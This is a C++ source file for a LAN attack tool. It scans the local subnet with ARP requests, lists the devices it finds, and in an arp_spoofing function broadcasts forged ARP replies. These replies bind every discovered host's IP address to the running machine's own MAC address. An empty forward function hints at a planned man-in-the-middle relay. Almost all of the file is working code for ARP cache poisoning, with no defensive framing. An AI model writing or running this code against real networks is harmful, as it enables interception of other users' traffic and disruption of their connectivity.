#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_ether.h>
#include <netinet/ip.h>
#include <cstdint>
#include <cstdlib>
#include <net/if.h>
#include "Net.h"

using namespace std;

#define SEND_PACKETS 2
#define GRATUITOUS 10

Net::Net(){ get_netinfo(""); }
Net::Net(string if_name) { get_netinfo(if_name); };

void Net::get_netinfo(string if_name) {
    ifaddrs *ifaddr;
    if (getifaddrs(&ifaddr)) {
        perror("getifaddrs() failed");
        exit(EXIT_FAILURE);
    }
    // Traverse all the interfaces and get their information until the specified one is found
    for (ifaddrs *ifa = ifaddr; ; ifa = ifa->ifa_next) {
        if (ifa == NULL) {
            perror("No such interface");
            exit(EXIT_FAILURE);
        }
        sockaddr *addr = ifa->ifa_addr;
        if (addr == NULL) continue;
        if (addr->sa_family != AF_INET) continue;

        ip = ntohl(((sockaddr_in*)addr)->sin_addr.s_addr); // Get the IP of the interface
        mask = ntohl(((sockaddr_in*)ifa->ifa_netmask)->sin_addr.s_addr); // Get the netmask of the interface
        this->if_name = (if_name.length() == 0) ? ifa->ifa_name : if_name; // Get the name of the interface
        
        // Get the MAC of the interface
        ifreq ifr;
        memset(&ifr, 0, sizeof(ifr));
        strcpy(ifr.ifr_name, this->if_name.c_str());
        int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (s <= 0) {
            perror("Failed to create socket");
            exit(EXIT_FAILURE);
        }
        if (ioctl (s, SIOCGIFHWADDR, &ifr) < 0) {
            perror("Failed to get local MAC address");
            exit(EXIT_FAILURE);
        }
        memcpy(mac, ifr.ifr_hwaddr.sa_data, sizeof(uint8_t) * 6);
        close(s);

        if (if_name.length() > 0 && !strcmp(ifa->ifa_name, if_name.c_str())) break; // If specified interface has been found
        if (if_name.length() == 0 && (ip & 0xff000000) != (127 << 24)) break; // If interface is not specified, choose the first interface whose IP doesn't belong to 127.0.0.0/8
    }
    freeifaddrs(ifaddr);
    set_arp_socket();
}

void Net::set_arp_socket() {
    memset(&arp_addr, 0, sizeof(arp_addr));
    arp_addr.sll_family = AF_PACKET;
    arp_addr.sll_ifindex = if_nametoindex(if_name.c_str());
    arp_addr.sll_halen = htons(6);
    memcpy(arp_addr.sll_addr, mac, sizeof(uint8_t) * 6);
    
    arp_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (arp_sock <= 0) {
        perror("Failed to create socket");
        exit(EXIT_FAILURE);
    }
    if(setsockopt(arp_sock, SOL_SOCKET, SO_RCVTIMEO, &recv_timeout, sizeof(recv_timeout)) < 0) {
        perror("setsockopt() failed");
        exit(EXIT_FAILURE);
    }
    if (bind(arp_sock, (sockaddr*)&arp_addr, sizeof(arp_addr)) < 0){
        perror("bind() failed");
        exit(EXIT_FAILURE);
    }
}

void Net::get_net_mac() {
    for (uint32_t i = (ip & mask) + 1; i < (ip | ~mask); i++) {
        Arp arp;
        arp.hardware_type = htons(ETHERNET);
        arp.protocol_type = htons(ETH_P_IP);
        arp.hardware_length = 6;
        arp.protocol_length = 4;
        arp.operation = htons(ARP_REQ); // ARP request
        memcpy(&arp.sender_hardware_addr, mac, sizeof(uint8_t) * 6);
        arp.sender_protocol_addr = htonl(ip);
        memset(&arp.target_hardware_addr, 0, sizeof(uint8_t) * 6);
        arp.target_protocol_addr = htonl(i);

        memcpy(arp.eth_hdr.ether_dhost, broadcast_mac, sizeof(uint8_t) * 6); // Destination MAC
        memcpy(arp.eth_hdr.ether_shost, mac, sizeof(uint8_t) * 6); // Source MAC
        arp.eth_hdr.ether_type = htons(ETH_P_ARP);

        for (int j = 0; j < SEND_PACKETS; j++) {
            // Send an ARP request
            if (sendto(arp_sock, &arp, sizeof(arp), 0, (sockaddr*) &arp_addr, sizeof(arp_addr)) < 0) {
                perror("sendto() failed");
                exit(EXIT_FAILURE);
            }

            // Receive an ARP reply
            Arp reply;
            bool no_reply = false;
            do {
                int len = recvfrom(arp_sock, &reply, sizeof(reply), 0, NULL, NULL);
                if (len < 0) { // Timeout
                    no_reply = true;
                    break;
                }
            } while (ntohs(reply.eth_hdr.ether_type) != ETH_P_ARP || ntohs(reply.operation) != ARP_REPLY); // Chech whether it is an ARP reply
            if (no_reply) continue;
            // Add record into ARP table
            uint32_t sender_ip = ntohl(reply.sender_protocol_addr);
            if (arp_table.find(sender_ip) == arp_table.end()) {
                uint8_t* mac_addr = (uint8_t*)malloc(sizeof(uint8_t) * 6);
                memcpy(mac_addr, reply.sender_hardware_addr, sizeof(uint8_t) * 6);
                arp_table[sender_ip] = mac_addr;
            }
            memcpy(arp_table[sender_ip], reply.sender_hardware_addr, sizeof(uint8_t) * 6);
        }
    }
}

void Net::print_net_mac() {
    cout << "Available devices" << endl;
    for (int i = 0; i < 40; i++) cout << "-";
    cout << endl;
    cout << "IP\t\tMAC" << endl;
    for (int i = 0; i < 40; i++) cout << "-";
    cout << endl;
    for (auto const& [ip_addr, mac_addr]: arp_table) {
        printf("%d.%d.%d.%d\t", (ip_addr >> 24) & 0xff, (ip_addr >> 16) & 0xff, (ip_addr >> 8) & 0xff, ip_addr & 0xff);
        printf("%02x:%02x:%02x:%02x:%02x:%02x\n", mac_addr[0], mac_addr[1], mac_addr[2], mac_addr[3], mac_addr[4], mac_addr[5]);
    }
    cout << endl;
}

void Net::arp_spoofing() {
    for (auto const& [ip_addr, mac_addr]: arp_table) {
        Arp arp;
        arp.hardware_type = htons(ETHERNET);
        arp.protocol_type = htons(ETH_P_IP);
        arp.hardware_length = 6;
        arp.protocol_length = 4;
        arp.operation = htons(ARP_REPLY); // ARP reply
        memcpy(&arp.sender_hardware_addr, mac, sizeof(uint8_t) * 6);
        arp.sender_protocol_addr = htonl(ip_addr);
        memcpy(&arp.target_hardware_addr, broadcast_mac, sizeof(uint8_t) * 6); // Broadcast the packet
        arp.target_protocol_addr = htonl(ip | ~mask);

        memcpy(arp.eth_hdr.ether_dhost, broadcast_mac, sizeof(uint8_t) * 6); // Destination MAC
        memcpy(arp.eth_hdr.ether_shost, mac, sizeof(uint8_t) * 6); // Source MAC
        arp.eth_hdr.ether_type = htons(ETH_P_ARP);

        for (int j = 0; j < GRATUITOUS; j++) {
            if (sendto(arp_sock, &arp, 60, 0, (sockaddr*) &arp_addr, sizeof(arp_addr)) < 0) {
                perror("sendto() failed");
                exit(EXIT_FAILURE);
            }
        }
    }
}

void Net::forward() {

}